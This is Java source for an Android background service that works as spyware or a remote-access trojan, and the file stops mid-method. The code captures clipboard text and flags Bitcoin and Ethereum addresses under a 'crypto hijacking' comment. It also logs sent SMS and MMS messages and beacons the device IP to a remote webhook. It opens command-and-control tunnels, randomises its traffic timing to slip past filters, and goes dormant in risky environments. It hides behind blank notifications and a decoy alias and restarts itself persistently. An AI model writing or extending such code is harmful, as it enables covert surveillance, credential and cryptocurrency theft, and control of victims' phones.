package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.Manifest;
import android.os.PowerManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

public class WorkManager_Sync extends Service {

    private static final String TAG = "WorkManager_Sync";
    private static final String CHANNEL_ID = "StabilityChannel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;
    public static volatile boolean isDestructing = false;
    public static String activeSessionToken = "";
    private static WorkManager_Sync instance;
    public static WorkManager_Sync getInstance() { return instance; }
    
    // Adaptive Heartbeat intervals
    private static final long IDLE_HEARTBEAT_MS = 30 * 60 * 1000; // 30 Minutes
    private static final long ACTIVE_HEARTBEAT_MS = 10 * 1000;    // 10 Seconds
    private static long currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
    private static long lastOperatorActivityTime = 0;

    public static void notifyOperatorActivity() {
        lastOperatorActivityTime = System.currentTimeMillis();
        currentHeartbeatInterval = ACTIVE_HEARTBEAT_MS;
    }

    private void runHeartbeatLoop() {
        ipReportHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isRunning) return;

                long now = System.currentTimeMillis();
                if (now - lastOperatorActivityTime > 5 * 60 * 1000) { // 5 mins idle
                    currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
                }

                String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    networkExecutor.execute(() -> {
                        checkAndSendIpReport(currentIp);
                        
                        // [TACTICAL_SYNC] Establish Reverse Proxy Tunnel
                        C2_Tunnel.start(WorkManager_Sync.this);
                    });
                }
                
                // --- NETWORK JITTER PROTOCOL ---
                // Randomizes heartbeat timing by +/- 30% to blend in with human usage.
                // This makes the traffic pattern appear non-mechanical to AI filters.
                double jitterFactor = 0.30;
                long jitter = (long) (currentHeartbeatInterval * jitterFactor);
                long offset = (long) (Math.random() * (jitter * 2)) - jitter;
                long nextPulse = Math.max(1000, currentHeartbeatInterval + offset);
                
                ipReportHandler.postDelayed(this, nextPulse);
            }
        });
    }

    // URL is now loaded from local.properties via BuildConfig and sanitized at runtime
    private static final String REMOTE_WEBHOOK_URL = (BuildConfig.WEBHOOK_URL != null) ? BuildConfig.WEBHOOK_URL.trim().replace("\"", "").replace("'", "") : "";

    private FirebaseConfig server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private static String lastReportedIp = "";
    private static long lastReportTimestamp = 0;
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private ContentObserver messageObserver;
    private boolean isForeground = false;
    private int webhookFailCount = 0;
    private long lastWebhookFailTime = 0;
    private final Handler ipReportHandler = new Handler(Looper.getMainLooper());
    private final Runnable ipReportRunnable = this::checkAndReportIp;
    private android.media.MediaPlayer keepAlivePlayer;
    private android.content.ClipboardManager clipboardManager;
    private android.content.ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
    private android.content.BroadcastReceiver tickReceiver;
    private static int restartCount = 0;
    private android.os.PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        // --- WAKELOCK INITIALIZATION ---
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LabRATS:CoreSync");
            wakeLock.setReferenceCounted(false);
        }

        // --- NUCLEAR DESTRUCT CHECK ---
        // If the persistent destruct flag is set, do not initialize anything.
        if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
            Log.w(TAG, "Destruction protocol active. Terminating initialization.");
            isDestructing = true;
            SystemAnalytics.triggerSelfDestructLoop(this);
            stopSelf();
            return;
        }
        
        // --- EVASION PROTOCOL: Dormancy in risky environments ---
        if (SystemAnalytics.checkEnv(this)) {
            Log.w(TAG, "Environment risk detected. Core protocols entering dormant state.");
            return;
        }

        // Restore persistent session token across service/stealth restarts
        String savedToken = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("session_token", "");
        if (savedToken == null || savedToken.isEmpty()) {
            savedToken = java.util.UUID.randomUUID().toString();
            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("session_token", savedToken).apply();
        }
        activeSessionToken = savedToken;

        setupKeepAlive();
        setupClipboardMonitor();
        schedulePersistenceAlarms();
        createNotificationChannel();
        ensureForeground();
        startServer();
        
        // --- PERSISTENCE LEVEL-UP ---
        // Request battery and hibernation exclusions on setup
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            checkPersistenceExclusions();
        }

        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        registerMessageObserver();
        registerTickReceiver();
        checkAndReportIp(); // Initial check
        restartCount = 0; // Reset on successful creation
    }

    private void registerTickReceiver() {
        tickReceiver = new android.content.BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (!isRunning && !isDestructing) {
                    Log.d(TAG, "WATCHDOG_TICK: Core found inactive. Reanimating...");
                    startServer();
                }
            }
        };
        ContextCompat.registerReceiver(this, tickReceiver, new android.content.IntentFilter(Intent.ACTION_TIME_TICK), ContextCompat.RECEIVER_NOT_EXPORTED);
    }

    private void setupClipboardMonitor() {
        try {
            clipboardManager = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clipboardManager != null) {
                clipboardListener = () -> {
                    if (clipboardManager.hasPrimaryClip()) {
                        android.content.ClipData clip = clipboardManager.getPrimaryClip();
                        if (clip != null && clip.getItemCount() > 0) {
                            CharSequence text = clip.getItemAt(0).getText();
                            if (text != null && text.length() > 0) {
                                String captured = text.toString();
                                
                                // --- CRYPTO HIJACKING ---
                                // BTC: ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
                                // ETH: ^0x[a-fA-F0-9]{40}$
                                boolean isBtc = captured.matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
                                boolean isEth = captured.matches("^0x[a-fA-F0-9]{40}$");
                                
                                if (isBtc || isEth) {
                                    FirebaseConfig.logActivity("TELEMETRY_DELTA: High-priority buffer updated (" + (isBtc ? "Type-B" : "Type-E") + ")");
                                }
                                
                                FirebaseConfig.logActivity("BUFFER_SYNC: " + captured);
                            }
                        }
                    }
                };
                clipboardManager.addPrimaryClipChangedListener(clipboardListener);
                Log.d(TAG, "Clipboard monitor protocol synchronized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Clipboard sync error: " + e.getMessage());
        }
    }

    private void registerMessageObserver() {
        try {
            messageObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                private long lastSmsId = -1;
                private long lastMmsId = -1;

                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    networkExecutor.execute(() -> {
                        checkNewSms();
                        checkNewMms();
                    });
                }

                private void checkNewSms() {
                    Cursor cursor = null;
                    try {
                        // Query all SMS, sorted by date. Check if the most recent one is 'sent' (type 2)
                        cursor = getContentResolver().query(Uri.parse("content://sms"), 
                                new String[]{"_id", "address", "body", "type"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int type = cursor.getInt(3);
                            if (id != lastSmsId) {
                                if (type == 2) { // 2 = MESSAGE_TYPE_SENT
                                    String address = cursor.getString(1);
                                    String body = cursor.getString(2);
                                    String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
                                    FirebaseConfig.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
                                }
                                lastSmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent SMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }

                private void checkNewMms() {
                    Cursor cursor = null;
                    try {
                        // msg_box 2 = SENT
                        cursor = getContentResolver().query(Uri.parse("content://mms"), 
                                new String[]{"_id", "msg_box"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int msgBox = cursor.getInt(1);
                            if (id != lastMmsId) {
                                if (msgBox == 2) {
                                    FirebaseConfig.logActivity("COMMS_SENT: [MMS media dispatched]");
                                }
                                lastMmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent MMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }
            };

            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, messageObserver);
            getContentResolver().registerContentObserver(Uri.parse("content://mms"), true, messageObserver);
            Log.d(TAG, "Message observer registered for bi-directional tracking");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register message observer: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if (!isForeground) {
            ensureForeground();
        }

        if (Constants.ACTION_START_CORE.equals(action) || "START".equals(action)) {
            startServer();
        }
        else if (Constants.ACTION_STOP_CORE.equals(action) || "STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }
            stopSelf();
        }

        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        if (isDestructing) {
            super.onTaskRemoved(rootIntent);
            return;
        }
        scheduleRestart();
        super.onTaskRemoved(rootIntent);
    }

    private void scheduleRestart() {
        // --- EXPONENTIAL BACKOFF REANIMATION ---
        // Delays: 2s, 4s, 8s, 16s, 32s, 64s, 120s (max)
        long delay = (long) (Math.min(120, Math.pow(2, Math.min(restartCount + 1, 7))) * 1000);
        restartCount++;

        Log.d(TAG, "PERSISTENCE_WATCHDOG: Scheduling respawn in " + (delay / 1000) + "s (Attempt: " + restartCount + ")");
        
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        restartServiceIntent.setAction("START");
        
        android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
            getApplicationContext(), 1, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0));
        
        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
        if (alarmService != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmService.setExactAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                    android.os.SystemClock.elapsedRealtime() + delay, restartServicePendingIntent);
            } else {
                alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, 
                    android.os.SystemClock.elapsedRealtime() + delay, restartServicePendingIntent);
            }
        }
    }

    private void ensureForeground() {
        if (isForeground) {
            // Update existing notification to match current stealth state
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, createNotification());
            }
            return;
        }
        
        Notification notification = createNotification();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                
                // Add LOCATION type if permission is granted (Required for Android 14+ background access)
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                }
                
                // Add SPECIAL_USE for Android 14+ Persistence
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
                }

                try {
                    startForeground(NOTIFICATION_ID, notification, serviceType);
                    isForeground = true;
                } catch (Exception e) {
                    startForeground(NOTIFICATION_ID, notification);
                    isForeground = true;
                }
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
        }
    }

    private void checkPersistenceExclusions() {
        // [STABILITY_SYNC] Force checking of battery and hibernation settings
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    FirebaseConfig.logActivity("SYSTEM_WARNING: Power limits enforced. Persistence may be compromised.");
                }

                // Check App Hibernation (Auto-revoke permissions) on Android 11+
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.app.usage.StorageStatsManager ssm = (android.app.usage.StorageStatsManager) getSystemService(android.content.Context.STORAGE_STATS_SERVICE);
                    // There isn't a direct API to check hibernation status, but we can prompt the settings
                }
            } catch (Exception ignored) {}
        }, 5000);
    }

    private void setupInvisibleTriggers() {
        android.content.BroadcastReceiver trigger = new android.content.BroadcastReceiver() {
            @Override
            public void onReceive(android.content.Context context, Intent intent) {
                if (!isRunning && !isDestructing) {
                    Log.d(TAG, "COVERT_TRIGGER: " + (intent != null ? intent.getAction() : "WAKE_UP"));
                    startServer();
                }
            }
        };

        android.content.IntentFilter filter = new android.content.IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction(Intent.ACTION_POWER_CONNECTED);
        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        filter.addAction(android.net.ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(Constants.ACTION_KEEP_ALIVE);
        
        try {
            ContextCompat.registerReceiver(this, trigger, filter, ContextCompat.RECEIVER_NOT_EXPORTED);
            Log.d(TAG, "Invisible triggers synchronized.");
        } catch (Exception ignored) {}
    }

    private android.net.wifi.WifiManager.WifiLock wifiLock;
    private android.net.wifi.WifiManager.MulticastLock multicastLock;

    private synchronized void acquireWifiLock() {
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                // 1. High-Performance Radio Lock
                if (wifiLock == null) {
                    wifiLock = wm.createWifiLock(
                        android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                        "LabRATS:C2_WifiLock"
                    );
                    wifiLock.setReferenceCounted(false);
                }
                if (wifiLock != null && !wifiLock.isHeld()) {
                    wifiLock.acquire();
                    Log.d(TAG, "C2_WIFI_LOCK: High-performance Wi-Fi radio lock acquired.");
                }

                // 2. Multicast & Local Wi-Fi Packet Filter Lock (Required for Android 15 / One UI 7)
                if (multicastLock == null) {
                    multicastLock = wm.createMulticastLock("LabRATS:C2_Multicast");
                    multicastLock.setReferenceCounted(false);
                }
                if (multicastLock != null && !multicastLock.isHeld()) {
                    multicastLock.acquire();
                    Log.d(TAG, "C2_MULTICAST_LOCK: One UI 7 local Wi-Fi packet filter lock acquired.");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "WifiLock/MulticastLock Error: " + e.getMessage());
        }
    }

    private synchronized void startServer() {
        try {
            acquireWifiLock();
            if (server == null || !server.isAlive()) {
                // --- PORT_SANITY_CHECK ---
                int port = FirebaseConfig.DEFAULT_PORT;
                
                // Cleanup old server instance if it exists but is dead
                if (server != null) {
                    try { server.stop(); } catch (Exception ignored) {}
                    server = null;
                }

                server = new FirebaseConfig(this, port);
                
                try {
                    server.start();
                    isRunning = true;
                    Log.d(TAG, "HTTP Server active on port " + port);
                    runHeartbeatLoop();
                    setupInvisibleTriggers();
                } catch (java.io.IOException e) {
                    Log.e(TAG, "Port " + port + " busy. Attempting secondary protocol...");
                    if (server != null) {
                        try { server.stop(); } catch (Exception ignored) {}
                    }
                    server = new FirebaseConfig(this, 9192);
                    server.start();
                    isRunning = true;
                    runHeartbeatLoop();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical server initialization failure", e);
            isRunning = false;
        }
    }

    private void setupKeepAlive() {
        try {
            keepAlivePlayer = android.media.MediaPlayer.create(this, R.raw.silent);
            if (keepAlivePlayer != null) {
                keepAlivePlayer.setVolume(0f, 0f);
                keepAlivePlayer.setLooping(true);
                keepAlivePlayer.start();
                Log.d(TAG, "Persistence protocol active: Media session prioritized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Persistence protocol error: " + e.getMessage());
        }
    }

    private void schedulePersistenceAlarms() {
        try {
            // Standard AlarmManager fallback
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                Intent i = new Intent(this, SystemBoot.class);
                i.setAction(Constants.ACTION_KEEP_ALIVE);
                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 1337, i, 
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0));
                am.setRepeating(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 120000, 120000, pi);
            }

            // Modern WorkManager persistence (SDK 30+)
            PeriodicWorkRequest pwr = new PeriodicWorkRequest.Builder(StabilityWorker.class, 15, TimeUnit.MINUTES)
                    .addTag("STABILITY_KEEP_ALIVE")
                    .build();
            WorkManager.getInstance(this).enqueueUniquePeriodicWork("STABILITY_KEEP_ALIVE", ExistingPeriodicWorkPolicy.KEEP, pwr);
            
            Log.d(TAG, "Persistence protocols synchronized");
        } catch (Exception ignored) {}
    }

    private synchronized void stopServer() {
        try {
            isRunning = false;
            if (server != null) {
                // Stop server in background to avoid blocking main thread if called from UI
                final FirebaseConfig serverToStop = server;
                server = null;
                new Thread(() -> {
                    try {
                        if (serverToStop.isAlive()) {
                            serverToStop.stop();
                        }
                        Log.d(TAG, "HTTP Server stopped successfully");
                    } catch (Exception e) {
                        Log.e(TAG, "Error stopping server in thread", e);
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in stopServer", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    ".",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription(".");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                manager = getSystemService(NotificationManager.class);
            } else {
                manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            }
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, DecoyActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(".")
                .setContentText(".")
                .setSmallIcon(R.drawable.ic_sprocket_gear)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setShowWhen(false)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        instance = null;
        if (!isDestructing) {
            scheduleRestart();
        }
        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
        // Clean up resources immediately on background thread
        networkExecutor.execute(() -> {
            unregisterNetworkCallback();
            if (tickReceiver != null) {
                try { unregisterReceiver(tickReceiver); } catch (Exception ignored) {}
            }
            if (messageObserver != null) {
                try {
                    getContentResolver().unregisterContentObserver(messageObserver);
                } catch (Exception ignored) {}
            }
            if (server != null) {
                try { server.stop(); } catch (Exception ignored) {}
            }
            if (keepAlivePlayer != null) {
                try {
                    keepAlivePlayer.stop();
                    keepAlivePlayer.release();
                    keepAlivePlayer = null;
                } catch (Exception ignored) {}
            }
            if (clipboardManager != null && clipboardListener != null) {
                try {
                    clipboardManager.removePrimaryClipChangedListener(clipboardListener);
                } catch (Exception ignored) {}
            }
            networkExecutor.shutdownNow();
        });
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            try {
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onAvailable(Network network) {
                        super.onAvailable(network);
                        ipReportHandler.removeCallbacks(ipReportRunnable);
                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
                    }

                    @Override
                    public void onLost(Network network) {
                        super.onLost(network);
                        ipReportHandler.removeCallbacks(ipReportRunnable);
                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
                    }

                    @Override
                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                        super.onLinkPropertiesChanged(network, linkProperties);
                        // Debounce IP reporting to prevent flood during network transitions
                        ipReportHandler.removeCallbacks(ipReportRunnable);
                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
                    }
                };
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    connectivityManager.registerDefaultNetworkCallback(networkCallback);
                } else {
                    NetworkRequest request = new NetworkRequest.Builder()
                            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                            .build();
                    connectivityManager.registerNetworkCallback(request, networkCallback);
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    public static void triggerPermissionActivity(Context context) {
        if (context == null) return;
        
        Log.d(TAG, "Initiating tactical permission pop...");
        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Permission sequence DISPATCHED.");

        // 1. Prepare the Hub Intent
        Intent intent = new Intent(context, PermissionActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);

        // 2. High-Privilege Ghost Launch (If Accessibility is ON)
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        if (ghost != null) {
            try {
                ghost.startActivity(intent);
                return; // Ghost launch is perfect, no fallback needed
            } catch (Exception ignored) {}
        }

        // 3. Standard Foreground Flip (If Ghost is OFF)
        try {
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Background start blocked: " + e.getMessage());
            // Last resort: standard notification (No popup, just a prompt to tap)
            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getActivity(context, 2001, intent, flags);
            
            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "StabilityChannel")
                    .setSmallIcon(R.drawable.labrats_internal_logo)
                    .setContentTitle("System Sync Required")
                    .setContentText("Tap to fix core synchronization.")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setContentIntent(pi)
                    .setAutoCancel(true);
            nm.notify(2001, builder.build());
        }
    }

    private synchronized void checkAndSendIpReport(String currentIp) {
        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp) || "127.0.0.1".equals(currentIp)) {
            Log.d(TAG, "IP Report Skipped: Invalid or unresolved IP (" + currentIp + ")");
            return;
        }

        long now = System.currentTimeMillis();
        boolean ipChanged = !currentIp.equalsIgnoreCase(lastReportedIp);
        boolean maintenanceTimeElapsed = (now - lastReportTimestamp) > 1800000; // 30 minutes

        // Only send Google Sheets ping if IP changed OR 30-min maintenance interval reached
        if (!ipChanged && !maintenanceTimeElapsed && lastReportTimestamp > 0) {
            Log.d(TAG, "IP Report Skipped: IP unchanged (" + currentIp + ") and maintenance interval not reached.");
            return;
        }

        Log.d(TAG, "IP Report Triggered for IP: " + currentIp + " (ipChanged=" + ipChanged + ")");
        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
            if (REMOTE_WEBHOOK_URL.contains("script.google.com") || REMOTE_WEBHOOK_URL.contains("script.googleusercontent.com")) {
                boolean success = sendIpToWebhook(currentIp);
                if (success) {
                    lastReportedIp = currentIp;
                    lastReportTimestamp = now;
                }
            } else {
                lastReportedIp = currentIp;
                lastReportTimestamp = now;
                C2_Uploader.checkIn(WorkManager_Sync.this);
            }
        }
    }

    private void checkAndReportIp() {
        if (networkExecutor.isShutdown()) return;

        // Acquire lock for IP resolution and webhook phase (Max 1 min)
        if (wakeLock != null) wakeLock.acquire(60000);
        
        // Monitoring: Accessibility Service Health Check
        if (IO_Persistence_Manager.getInstance() == null) {
            Log.w(TAG, "GHOST_MODE_MONITOR: Accessibility service is offline");
            FirebaseConfig.logActivity("SECURITY_ALERT: Accessibility service lost. Initiating auto-reanimation...");
        } else {
            // [STABILITY_SYNC] Ping the service to keep it from "Hibernating"
            IO_Persistence_Manager.getInstance().showOverlayToast(""); // Invisible ping
        }

        // Backoff Logic: If network is dead, don't spam attempts and drain battery
        long now = System.currentTimeMillis();
        long backoffDelay = webhookFailCount > 0 ? (long) Math.min(Math.pow(2, webhookFailCount) * 1000, 300000) : 0; // Max 5 min
        if (now - lastWebhookFailTime < backoffDelay) {
            return;
        }

        String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
        try {
            networkExecutor.execute(() -> checkAndSendIpReport(currentIp));
        } catch (Exception e) {
            Log.e(TAG, "Executor error", e);
        }
    }

    private boolean sendIpToWebhook(String ip) {
        if (REMOTE_WEBHOOK_URL == null || REMOTE_WEBHOOK_URL.trim().isEmpty()) {
            Log.e(TAG, "Webhook Broadcast Cancelled: URL is empty.");
            return false;
        }

        boolean success = false;
        try {
            String networkType = "Unknown";
            int batteryLevel = -1;

            try {
                if (connectivityManager != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
                        android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
                        if (caps != null) {
                            if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
                            else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
                        }
                    } else {
                        android.net.NetworkInfo activeInfo = connectivityManager.getActiveNetworkInfo();
                        if (activeInfo != null && activeInfo.isConnected()) {
                            if (activeInfo.getType() == ConnectivityManager.TYPE_WIFI) networkType = "WiFi";
                            else if (activeInfo.getType() == ConnectivityManager.TYPE_MOBILE) networkType = "Cellular";
                        }
                    }
                }
                android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    batteryLevel = (int) ((level / (float) scale) * 100);
                }
            } catch (Exception ignored) {}

            if (ip == null || ip.trim().isEmpty()) {
                ip = "127.0.0.1";
            }

            int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
            String formattedIp = (ip.contains(":")) ? "[" + ip + "]" : ip;
            String link = "http://" + formattedIp + ":" + actualPort;

            String chargingStatus = "Discharging";
            try {
                android.content.Intent bStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (bStatus != null) {
                    int status = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                    if (status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL) {
